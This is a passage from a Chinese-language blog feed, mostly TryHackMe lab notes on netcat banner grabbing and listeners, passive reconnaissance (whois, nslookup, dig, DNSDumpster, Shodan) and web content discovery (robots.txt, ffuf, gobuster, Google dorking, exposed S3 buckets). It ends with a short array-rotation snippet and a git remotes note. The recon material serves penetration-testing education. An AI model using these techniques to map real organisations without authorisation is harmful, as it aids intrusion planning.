UDP协议。它可以充当连接到侦听端口的客户端；或者，它可以充当侦听(你选择的)端口的服务器。</p><p>首先，与 Telnet的使用方法类似，你可以使用<code>nc MACHINE_IP PORT</code>来获取 banner信息，需要注意的是，你可能需要在 GET 行之后按 SHIFT + ENTER 。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pentester@TryHackMe$ nc 10.10.221.57 80</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">host: netcat</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.6.2</span><br><span class="line">Date: Tue, 17 Aug 2021 11:39:49 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 867</span><br><span class="line">Last-Modified: Tue, 17 Aug 2021 11:12:16 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line">ETag: <span class="string">"611b9990-363"</span></span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><p>在上面所示的终端中，我们使用 <code>nc 10.10.221.57 80</code> 连接到10.10.221.57 端口 80 。接下来，我们使用<code>GET / HTTP/1.1</code>为默认页面发出 GET请求；我们向目标服务器指定客户端支持 HTTP版本1.1。最后，我们需要为主机命名，因此我们添加了一个新行<code>host: netcat</code>；你可以为主机命名任何名称，因为这对本练习没有影响。</p><p>根据输出 <code>Server: nginx/1.6.2</code>，我们可以得知：在目标计算机的端口 80 上，1.6.2版本的 Nginx正在监听传入的连接。</p><p>你还可以使用 netcat 监听 TCP端口并连接到另一个系统上的监听端口。在服务器系统上，你要打开端口并监听它，你可以使用<code>nc -lp 1234</code> 或更好的 <code>nc -vnlp 1234</code> ，它相当于<code>nc -v -l -n -p 1234</code>，只要端口号前面有<code>-p</code>参数，字母的确切顺序就无关紧要。</p><table><thead><tr class="header"><th style="text-align: center;">option</th><th style="text-align: center;">meaning</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">-l</td><td style="text-align: center;">Listen mode</td></tr><tr class="even"><td style="text-align: center;">-p</td><td style="text-align: center;">Specify the Port number</td></tr><tr class="odd"><td style="text-align: center;">-n</td><td style="text-align: center;">Numeric only; no resolution of hostnamesvia DNS</td></tr><tr class="even"><td style="text-align: center;">-v</td><td style="text-align: center;">Verbose output (optional, yet useful todiscover any bugs)</td></tr><tr class="odd"><td style="text-align: center;">-vv</td><td style="text-align: center;">Very Verbose (optional)</td></tr><tr class="even"><td style="text-align: center;">-k</td><td style="text-align: center;">Keep listening after clientdisconnects</td></tr></tbody></table><p>注意：</p><ul><li><code>-p</code>选项应该出现在你要监听的端口号之前。</li><li><code>-n</code>选项将避免 DNS 查找和警告。</li><li>小于 1024 的端口号需要 root 权限才能监听。</li></ul><p>在客户端，你将使用<code>nc 10.10.221.57 PORT_NUMBER</code>。这是使用<code>nc</code>进行回显的例子：成功建立与服务器的连接后，无论你在客户端输入什么，服务器端都会响应，反之亦然。</p><h2 id="总结">总结</h2><table><thead><tr class="header"><th style="text-align: center;">Command</th><th style="text-align: center;">Example</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">ping</td><td style="text-align: center;"><code>ping -c 10 10.10.221.57</code> onLinux or macOS</td></tr><tr class="even"><td style="text-align: center;">ping</td><td style="text-align: center;"><code>ping -n 10 10.10.221.57</code> onMS Windows</td></tr><tr class="odd"><td style="text-align: center;">traceroute</td><td style="text-align: center;"><code>traceroute 10.10.221.57</code> onLinux or macOS</td></tr><tr class="even"><td style="text-align: center;">tracert</td><td style="text-align: center;"><code>tracert 10.10.221.57</code> on MSWindows</td></tr><tr class="odd"><td style="text-align: center;">telnet</td><td style="text-align: center;"><code>telnet 10.10.221.57 PORT_NUMBER</code></td></tr><tr class="even"><td style="text-align: center;">netcat as client</td><td style="text-align: center;"><code>nc 10.10.221.57 PORT_NUMBER</code></td></tr><tr class="odd"><td style="text-align: center;">netcat as server</td><td style="text-align: center;"><code>nc -lvnp PORT_NUMBER</code></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>TryHackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>TryHackMe</tag>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Passive Reconnaissance（被动侦察）</title>
    <link href="/2023/01/18/Passive-Reconnaissance/"/>
    <url>/2023/01/18/Passive-Reconnaissance/</url>
    
    <content type="html"><![CDATA[<p>TryHackMe实验房间：https://tryhackme.com/room/passiverecon</p><h2 id="introduction">Introduction</h2><p>侦察(recon)可以定义为收集目标信息的初步调查。我们将侦察分为：</p><ol type="1"><li>被动侦察</li><li>主动侦察</li></ol><h3 id="被动侦察">被动侦察</h3><p>在被动侦察中，你将依赖于公开可用的知识。它是你可以从公共可用资源访问的知识，而无需直接与目标进行接触。想象一下，你远远地看着目标领地，却没有踏足那片领地。</p><p>被动侦察包括许多活动：</p><ul><li>从公共DNS服务器查找域的 DNS 记录。</li><li>检查与目标网站相关的招聘广告。</li><li>阅读有关目标公司的新闻文章。</li></ul><p>本文主要介绍三个命令行工具：</p><ul><li><code>whois</code></li><li><code>nslookup</code></li><li><code>dig</code></li></ul><p>以及两种在线服务的使用：</p><ul><li>DNSDumpster</li><li>Shodan.io</li></ul><p>这两个在线服务允许我们收集有关目标的信息，而无需直接连接到目标。</p><h3 id="主动侦察">主动侦察</h3><p>另一方面，主动侦察则不能如此谨慎地进行。它需要与目标直接接触。就像你检查门窗的锁，以及其他潜在的入口。</p><p>主动侦察包括的活动如下：</p><ul><li>连接到其中一个公司服务器，例如：HTTP、FTP、SMTP。</li><li>打电话到公司试图获取信息（社会工程）。</li><li>冒充修理工进入公司。</li></ul><p>考虑到主动侦察的侵入性，除非获得适当的法律授权，否则很快就会陷入法律麻烦。</p><h2 id="whois">Whois</h2><p>WHOIS 是遵循 <a href="https://www.ietf.org/rfc/rfc3912.txt">RFC3912</a>规范的请求和响应协议。WHOIS服务器在TCP端口43上侦听传入的请求。域名注册商负责维护其租赁域名的WHOIS记录。WHOIS服务器回复与请求的域相关的各种信息。通过WHOIS ，我们可以了解到以下信息：</p><ul><li>注册商：域名是通过哪个注册商注册的？</li><li>注册人的联系信息：姓名、组织、地址、电话等。(除非通过隐私服务隐藏)</li><li>创建、更新和过期日期：域名首次注册是什么时候？上次更新是什么时候？什么时候需要更新？</li><li>名称服务器(Name Server)：请求哪个服务器解析域名？</li></ul><p>使用语法是<code>whois DOMAIN_NAME</code>，其中<code>DOMAIN_NAME</code>是你试图获取信息的域。假设我们需要获取<code>tryhackme.com</code>的信息，直接执行<code>whois tryhackme.com</code>。得到如下信息：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">user@TryHackMe$ whois tryhackme.com</span><br><span class="line">[Querying whois.verisign-grs.com]</span><br><span class="line">[Redirected to whois.namecheap.com]</span><br><span class="line">[Querying whois.namecheap.com]</span><br><span class="line">[whois.namecheap.com]</span><br><span class="line">Domain name: tryhackme.com</span><br><span class="line">Registry Domain ID: 2282723194_DOMAIN_COM-VRSN</span><br><span class="line">Registrar WHOIS Server: whois.namecheap.com</span><br><span class="line">Registrar URL: http://www.namecheap.com</span><br><span class="line">Updated Date: 2021-05-01T19:43:23.31Z</span><br><span class="line">Creation Date: 2018-07-05T19:46:15.00Z</span><br><span class="line">Registrar Registration Expiration Date: 2027-07-05T19:46:15.00Z</span><br><span class="line">Registrar: NAMECHEAP INC</span><br><span class="line">Registrar IANA ID: 1068</span><br><span class="line">Registrar Abuse Contact Email: abuse@namecheap.com</span><br><span class="line">Registrar Abuse Contact Phone: +1.6613102107</span><br><span class="line">Reseller: NAMECHEAP INC</span><br><span class="line">Domain Status: clientTransferProhibited https://icann.org/epp<span class="comment">#clientTransferProhibited</span></span><br><span class="line">Registry Registrant ID: </span><br><span class="line">Registrant Name: Withheld <span class="keyword">for</span> Privacy Purposes</span><br><span class="line">Registrant Organization: Privacy service provided by Withheld <span class="keyword">for</span> Privacy ehf</span><br><span class="line">[...]</span><br><span class="line">URL of the ICANN WHOIS Data Problem Reporting System: http://wdprs.internic.net/</span><br><span class="line">&gt;&gt;&gt; Last update of WHOIS database: 2021-08-25T14:58:29.57Z &lt;&lt;&lt;</span><br><span class="line"><span class="string">For more information on Whois status codes, please visit https://icann.org/epp</span></span><br></pre></td></tr></tbody></table></figure><p>我们可以看到大量信息；我们将按照显示的顺序检查它们。首先，我们注意到我们被重定向到<code>whois.namecheap.com</code>以获取信息。由此可知，在这种情况下，<code>namecheap.com</code>目前正在维护该域名的WHOIS记录。此外，我们可以看到创建日期以及最后更新日期和过期日期。</p><p>接下来，我们获得有关注册商和注册人的信息。我们可以找到注册人的姓名和联系信息（除非他们使用某些隐私服务）。尽管未显示在上面，但我们获得了该域的管理员和技术联系人。最后，我们看到域名服务器，如果我们有任何DNS记录要查找，我们应该查询这些服务器。</p><p>可以检查收集的信息以发现新的攻击面，例如社会工程或技术攻击。例如，根据渗透测试的范围，你可能会考虑对管理员用户的电子邮件服务器或DNS服务器进行攻击，假设这些服务器属于你的客户端，并且属于渗透测试的范畴。</p><p>需要注意的是，由于自动化工具滥用WHOIS查询来获取电子邮件地址，许多WHOIS服务对此采取了措施。例如，他们可能会修改电子邮件地址。此外，许多注册者订阅隐私服务，以避免垃圾邮件发送者获取他们的电子邮件地址，并保持他们的信息隐私。</p><h2 id="nslookup">nslookup</h2><p>使用<code>nslookup</code>（名称服务器查找）查找域名的IP地址。你需要发出命令<code>nslookup DOMAIN_NAME</code>，例如<code>nslookup tryhackme.com</code>。或者，更一般地，你可以使用<code>nslookup OPTIONS DOMAIN_NAME SERVER</code>。这三个主要参数是：</p><ul><li><code>OPTIONS</code>包括如下表所示的查询类型。例如，你可以使用<code>A</code>(用于IPv4)或者<code>AAAA</code>(用于IPv6)。</li><li><code>DOMAIN_NAME</code>是你需要查询的域名。</li><li><code>SERVER</code>是要查询的DNS服务器，你可以选择要查询的任何本地或者公用的DNS服务器。Cloudflare提供<code>1.1.1.1</code>和<code>1.0.0.1</code>，Google提供<code>8.8.8.8</code>和<code>8.8.4.4</code>，Quad9提供<code>9.9.9.9</code>和<code>149.112.112.112</code>。如果你想替换ISP的DNS服务器，可以选择更多的公共DNS服务器。</li></ul><table><thead><tr class="header"><th style="text-align: center;">Query type</th><th style="text-align: center;">Result</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">A</td><td style="text-align: center;">IPv4 Addresses</td></tr><tr class="even"><td style="text-align: center;">AAAA</td><td style="text-align: center;">IPv6 Addresses</td></tr><tr class="odd"><td style="text-align: center;">CNAME</td><td style="text-align: center;">Canonical Name</td></tr><tr class="even"><td style="text-align: center;">MX</td><td style="text-align: center;">Mail Servers</td></tr><tr class="odd"><td style="text-align: center;">SOA</td><td style="text-align: center;">Start of Authority</td></tr><tr class="even"><td style="text-align: center;">TXT</td><td style="text-align: center;">TXT Records</td></tr></tbody></table><p>例如，使用<code>nslookup -type=A tryhackme.com 1.1.1.1</code>或<code>nslookup -type=a tryhackme.com 1.1.1.1</code>能够返回tryhackme.com 使用过的所有 IPv4 地址。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">user@TryHackMe$ nslookup -<span class="built_in">type</span>=A tryhackme.com 1.1.1.1</span><br><span class="line">Server:1.1.1.1</span><br><span class="line">Address:1.1.1.1<span class="comment">#53</span></span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:tryhackme.com</span><br><span class="line">Address: 172.67.69.208</span><br><span class="line">Name:tryhackme.com</span><br><span class="line">Address: 104.26.11.229</span><br><span class="line">Name:tryhackme.com</span><br><span class="line">Address: 104.26.10.229</span><br></pre></td></tr></tbody></table></figure><p>A 和 AAAA 记录分别用于返回 IPv4和IPv6地址。从渗透测试的角度来看，这种查找非常有用。在上面的示例中，我们从一个域名开始，获得了三个IPv4地址。假设这些 IP地址位于渗透测试的范围之内，就可以进一步检查它们是否存在不安全性。</p><p>假设你想了解特定域的电子邮件服务器和配置。可以使用<code>nslookup-type = MX tryhackme.com</code>。这里有一个例子:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">user@TryHackMe$ nslookup -<span class="built_in">type</span>=MX tryhackme.com</span><br><span class="line">Server:127.0.0.53</span><br><span class="line">Address:127.0.0.53<span class="comment">#53</span></span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">tryhackme.commail exchanger = 5 alt1.aspmx.l.google.com.</span><br><span class="line">tryhackme.commail exchanger = 1 aspmx.l.google.com.</span><br><span class="line">tryhackme.commail exchanger = 10 alt4.aspmx.l.google.com.</span><br><span class="line">tryhackme.commail exchanger = 10 alt3.aspmx.l.google.com.</span><br><span class="line">tryhackme.commail exchanger = 5 alt2.aspmx.l.google.com.</span><br></pre></td></tr></tbody></table></figure><p>我们可以看到 tryhackme.com 当前的电子邮件配置使用 Google。由于 MX会查找 Mail Exchange服务器，我们注意到当一个邮件服务器尝试向<code>@tryhackme.com</code>发送电子邮件时，它会尝试连接到订单为 1 的<code>aspmx.l.google.com</code>。如果繁忙或不可用，邮件服务器将尝试按顺序连接到下一个邮件交换服务器、<code>alt1.aspmx.l.google.com</code> 或<code>alt2.aspmx.l.google.com</code>。</p><p>Google 提供了列出的邮件服务器;因此，我们不应该期望邮件服务器运行的是一个易受攻击的服务器版本。但是，在其他情况下，我们可能会发现邮件服务器没有得到充分的安全保护或修补。</p><p>当你继续被动地侦察你的目标时，这些信息可能会被证明是有价值的。你可以对其他域名重复类似的查询，并尝试不同的类型，例如<code>-type=txt</code>。谁知道你一路走来会发现什么样的信息呢！</p><h2 id="dig">dig</h2><p>对于更高级的 DNS 查询和其他功能，可以使用 <code>dig</code>，即“Domain Information Groper”的首字母缩写。让我们使用 dig 查找 MX记录，并将它们与 <code>nslookup</code> 进行比较。我们可以使用<code>dig DOMAIN _ NAME</code>，但是为了指定记录类型，我们将使用<code>dig DOMAIN_NAME TYPE</code>。或者，我们可以使用<code>dig @SERVER DOMAIN_NAME TYPE</code>选择要查询的服务器。</p><ul><li><code>SERVER</code>是要查询的 DNS服务器。</li><li><code>DOMAIN_NAME</code>是你正在查询的域名。</li><li><code>TYPE</code>包含 DNS 记录类型。</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user@TryHackMe$ dig tryhackme.com MX</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.16.19-RH &lt;&lt;&gt;&gt; tryhackme.com MX</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;</span><br></pre></td></tr></tbody></table></figure><p>快速比较一下 <code>nslookup</code> 和 <code>dig</code>的输出，发现<code>dig</code> 返回了更多的信息，比如默认情况下的 TTL (Time ToLive)。如果想查询<code>1.1.1.1</code> DNS 服务器，可以执行<code>dig @1.1.1.1 tryhackme.com MX</code>。</p><h2 id="dnsdumpster">DNSDumpster</h2><p>DNS 查找工具(如 nslookup 和dig)无法自行查找子域。你正在检查的域可能包括一个不同的子域，该子域可以显示关于目标的许多信息。例如，如果tryhackme.com 拥有子域名的 wiki.tryhackme.com 和 webmail.tryhackme.com，那么你需要了解更多关于这两个域名的信息，因为它们可以保存关于你的目标的大量信息。有可能其中一个子域已经建立，但没有定期更新。缺乏适当的定期更新通常会导致脆弱的服务。但是我们怎么知道这样的子域存在呢？</p><p>我们可以考虑使用多个搜索引擎来编制一个公开已知子域名的列表。一个搜索引擎是不够的;此外，我们应该期望通过至少数十个搜索结果来找到有趣的数据。毕竟，你正在寻找没有明确公布的子域，因此不必将其添加到搜索结果的第一页。发现此类子域的另一种方法是依靠暴力强制查询来查找哪些子域具有DNS记录。</p><p>为了避免这种耗时的搜索，可以使用一个在线服务，该在线服务可以提供 DNS查询的详细结果，如 <a href="https://dnsdumpster.com/">DNSDumpster</a>。如果我们在 DNSDumpster中搜索 <code>tryhackme.com</code>，我们会发现子域名<code>blog.tryhackme.com</code> ，这是典型的 DNS查询所无法提供的。此外，DNSDumpster将以易于阅读的表格和图表的形式返回收集的 DNS 信息。DNSDumpster还将提供任何收集到的有关监听服务器的信息。</p><h2 id="shodan.io">Shodan.io</h2><p>当你的任务是针对特定目标运行渗透测试时，作为被动侦察阶段的一部分，像<a href="https://www.shodan.io/">Shodan.io</a>这样的服务可以帮助你了解客户网络的各种信息，而不需要主动连接。此外，在防御方面，你可以使用Shodan.io 中的不同服务来了解属于你的组织的已连接和已公开的设备。</p><p>Shodan.io试图连接到每一个可以在线访问的设备，以建立一个连接“事物”的搜索引擎，与网页搜索引擎形成对比。一旦得到响应，它就会收集与服务相关的所有信息，并将其保存在数据库中，以便进行搜索。以下是tryhackme.com 服务器的保存记录。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230118223806186.png" alt="image-20230118223806186"><figcaption aria-hidden="true">image-20230118223806186</figcaption></figure><p>这个记录显示了一个 Web 服务器; 然而，正如前面提到的，Shodan.io收集与它能在线找到的任何设备相关的信息。在 Shodan.io 上搜索<code>tryhackme.com</code> 至少会显示上面截图所示的记录。通过 Shodan.io的搜索结果，我们可以了解到一些与搜索相关的东西，比如:</p><ul><li>IP地址</li><li>托管公司</li><li>地理位置</li><li>服务器类型与版本</li></ul><h2 id="总结">总结</h2><table><colgroup><col style="width: 46%"><col style="width: 53%"></colgroup><thead><tr class="header"><th style="text-align: center;">Purpose</th><th style="text-align: center;">Commandline Example</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">Lookup WHOIS record</td><td style="text-align: center;"><code>whois tryhackme.com</code></td></tr><tr class="even"><td style="text-align: center;">Lookup DNS A records</td><td style="text-align: center;"><code>nslookup -type=A tryhackme.com</code></td></tr><tr class="odd"><td style="text-align: center;">Lookup DNS MX records at DNS server</td><td style="text-align: center;"><code>nslookup -type=MX tryhackme.com 1.1.1.1</code></td></tr><tr class="even"><td style="text-align: center;">Lookup DNS TXT records</td><td style="text-align: center;"><code>nslookup -type=TXT tryhackme.com</code></td></tr><tr class="odd"><td style="text-align: center;">Lookup DNS A records</td><td style="text-align: center;"><code>dig tryhackme.com A</code></td></tr><tr class="even"><td style="text-align: center;">Lookup DNS MX records at DNS server</td><td style="text-align: center;"><code>dig @1.1.1.1 tryhackme.com MX</code></td></tr><tr class="odd"><td style="text-align: center;">Lookup DNS TXT records</td><td style="text-align: center;"><code>dig tryhackme.com TXT</code></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>TryHackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>TryHackMe</tag>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Content Discovery（搜集网站信息）</title>
    <link href="/2023/01/04/ContentDiscovery/"/>
    <url>/2023/01/04/ContentDiscovery/</url>
    
    <content type="html"><![CDATA[<p>Learn the various ways of discovering hidden or private content on awebserver that could lead to new vulnerabilities.</p><p>TryHackMe实验房间： https://tryhackme.com/room/contentdiscovery</p><h2 id="manually手动">Manually（手动）</h2><h3 id="robots.txt">Robots.txt</h3><p>该文件是个文档，它告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取，而搜索引擎则通过读取robots.txt文件来识别这个页面是否允许被抓取；或者禁止特定的搜索引擎爬取网站。</p><p>通常的做法是限制某些网站区域，使其不显示在搜索引擎结果中。这些页面可能是为网站客户提供的管理门户或文件，而<code>robots.txt</code>文件为我们提供了网站上大量（网站拥有者不希望我们访问的）网址。</p><h3 id="favicon网页图标">Favicon（网页图标）</h3><p>有时，当框架用于构建网站时，作为安装一部分的网页图标会被遗留下来，如果网站开发人员没有用自定义的图标替换它，这可以为我们提供关于框架的线索。OWASP托管一个公共框架图标数据库，您可以使用该数据库对照目标<strong>favicon</strong>进行检查（https://wiki.owasp.org/index.php/OWASP_favicon_database），一旦我们了解了框架堆栈，我们就可以使用外部资源来了解更多关于它的信息。</p><p>注：上述网站中是使用 md5 哈希值来表示对应的图标。</p><h3 id="sitemap.xml">Sitemap.xml</h3><p>与限制搜索引擎爬虫的 robots.txt 文件不同，sitemap.xml文件提供了网站所有者希望在搜索引擎上列出的每个文件的列表。这些有时可能包含网站中难以导航的区域，甚至列出当前网站不再使用但仍在幕后工作的一些旧网页。</p><h3 id="http-headers">HTTP Headers</h3><p>当客户端向Web服务器发出请求时，服务器会返回各种 HTTP headers，这些headers 通常包含一些有用的信息，例如 webserver软件使用的编程/脚本语言，软件版本等。</p><p>可以使用<code>curl</code>工具对服务器发起请求。</p><h3 id="framework-stack框架">Framework Stack（框架）</h3><p>找到网站的框架信息，并通过框架网站找到漏洞。</p><h2 id="automated自动">Automated（自动）</h2><p><strong>Automated Discovery</strong>是指使用工具发现内容而不是手动进行的过程。此过程是自动化的，因为它通常包含向Web服务器的数百，数千甚至数百万个请求。这些请求检查网站上是否存在文件或目录，使我们可以访问我们以前不知道的资源。使用称为<strong>Wordlists</strong> 的资源使此过程成为可能。</p><p><strong>Wordlists</strong>只是包含一长串常用单词的文本文件；它们可以涵盖许多不同的用例。例如，密码表将包含最常用的密码。</p><h3 id="ffuf">ffuf</h3><p>ffuf 是一款Go语言编写的高速WebFuzzer工具，该项目深受大型项目gobuster和wfuzz的启发。使用 wordlists进行扫描。</p><h3 id="dirb">dirb</h3><p>基于字典的 web 目录扫描工具。</p><h3 id="gobuster">Gobuster</h3><p>主要用于网站目录扫描和子域名收集，对目录、文件、DNS和VHost等对象进行暴力破解攻击。</p><h2 id="osintopen-source-intelligence">OSINT（Open-SourceIntelligence）</h2><h3 id="google-hacking-dorking">Google Hacking / Dorking</h3><p>利用Google高级搜索获取信息，例如下面的表格：</p><table><colgroup><col style="width: 11%"><col style="width: 20%"><col style="width: 68%"></colgroup><thead><tr class="header"><th><strong>Filter</strong></th><th><strong>Example</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr class="odd"><td>site</td><td>site:tryhackme.com</td><td>returns results only from the specified website address</td></tr><tr class="even"><td>inurl</td><td>inurl:admin</td><td>returns results that have the specified word in the URL</td></tr><tr class="odd"><td>filetype</td><td>filetype:pdf</td><td>returns results which are a particular file extension</td></tr><tr class="even"><td>intitle</td><td>intitle:admin</td><td>returns results that contain the specified word in the title</td></tr></tbody></table><h3 id="wappalyzer">Wappalyzer</h3><p>Wappalyzer（https://www.wappalyzer.com/）是一种在线工具，可以帮助识别网站使用的技术，例如框架、内容管理系统（CMS）、支付处理器等，甚至可以找到对应的版本号。</p><h3 id="wayback-machine网站时光机">Wayback Machine（网站时光机）</h3><p>网站时光机是万维网的数字档案馆，由位于美国加利福尼亚州旧金山的非营利组织互联网档案馆创建，亦为该组织最重要的服务之一。它允许用户“回到过去”，查看过去的网站的样子。通过该网站可以获取网站的一些依旧在使用的旧页面。</p><h3 id="github">Github</h3><p>可以使用GitHub的搜索功能来查找公司名称或网站名称，以尝试找到属于目标的存储库。一旦发现，或许可以访问尚未找到的源代码，密码或其他内容。</p><h3 id="s3-buckets">S3 Buckets</h3><p>S3Buckets是亚马逊AWS提供的一项存储服务，允许人们将文件甚至静态网站内容保存在通过HTTP和HTTPS访问的云中。文件的所有者可以设置访问权限，以使文件公开、私有甚至可写。有时，这些访问权限设置不正确，无意中允许访问公众无法访问的文件。</p>]]></content>
    
    
    <categories>
      
      <category>TryHackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>TryHackMe</tag>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Rotate</title>
    <link href="/2022/10/17/Rotate/"/>
    <url>/2022/10/17/Rotate/</url>
    
    <content type="html"><![CDATA[<p>参考：https://zhuanlan.zhihu.com/p/43568725https://www.jiuzhang.com/solutions/rotate-array/</p><h1 id="翻转数组rotate-array">翻转数组（Rotate Array）</h1><p>给定一个数组，将数组向右移动k步，其中k为非负数。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,2,3,4,5,6,7] and k = 3</span><br><span class="line">Output: [5,6,7,1,2,3,4]</span><br><span class="line">Explanation:</span><br><span class="line">rotate 1 steps to the right: [7,1,2,3,4,5,6]</span><br><span class="line">rotate 2 steps to the right: [6,7,1,2,3,4,5]</span><br><span class="line">rotate 3 steps to the right: [5,6,7,1,2,3,4]</span><br></pre></td></tr></tbody></table></figure><p>假设给定一个二进制数<code>a='0b11001101'</code>，（<strong>必须为8位或16位或32位</strong>）求rotate right 3 的结果，代码如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rotate</span>(<span class="params">self, nums, k</span>):</span><br><span class="line">            <span class="comment"># Write your code here</span></span><br><span class="line">            length = <span class="built_in">len</span>(nums)</span><br><span class="line">            k = k % length</span><br><span class="line">            result = nums[length - k : length] + nums[:length - k]</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">a=<span class="string">'0b11001101'</span></span><br><span class="line">a=<span class="built_in">list</span>(a[<span class="number">2</span>:])</span><br><span class="line">r=Solution()</span><br><span class="line">x=r.rotate(a,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></tbody></table></figure><p>运行结果为<code>['1', '0', '1', '1', '1', '0', '0', '1']</code>。</p>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rotate</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于git的远程仓库问题</title>
    <link href="/2022/10/16/%E5%85%B3%E4%BA%8Egit%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93%E9%97%AE%E9%A2%98/"/>
    <url>/2022/10/16/%E5%85%B3%E4%BA%8Egit%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>最近一直断断续续地学习git的使用方法，今天在学习的时候遇到了一个关于远程仓库的问题：<strong>如何在克隆远程仓库后，将其关联到自己的远程仓库。</strong></p><p>当使用 git clone时，就会将远程仓库克隆到本地。利用命令<code>git remote -v</code>查看克隆的远程仓库的信息，例如：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git remote -v</span><br><span class="line">origin  https://github.com/user/repo.git (fetch)</span><br><span class="line">origin  https://github.com/user/repo.git (push)</span><br></pre></td></tr></tbody></table></figure><p>origin 为默认的远程仓库的别名。此时， origin 默认的 url是原始仓库的地址。想要关联到新的远程仓库主要有两种方法：</p><h3 id="添加远程仓库">添加远程仓库</h3><p>使用<code>git remote add</code>命令添加。</p><p>该命令采用两个参数：远程名称（例如<code>new</code> ）、远程 URL（例如<code>https://github.com/user_1/repo.git</code>）。</p><p>例如：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ git remote add new https://github.com/user_1/repo.git <span class="comment"># Set a new remote</span></span><br><span class="line"></span><br><span class="line">$ git remote -v</span><br><span class="line">origin  https://github.com/user/repo.git (fetch) <span class="comment"># 原始仓库</span></span><br><span class="line">origin  https://github.com/user/repo.git (push)  <span class="comment"># 原始仓库</span></span><br><span class="line">new  https://github.com/user_1/repo.git (fetch) <span class="comment"># 新添加的远程仓库</span></span><br><span class="line">new  https://github.com/user_1/repo.git (push) <span class="comment"># 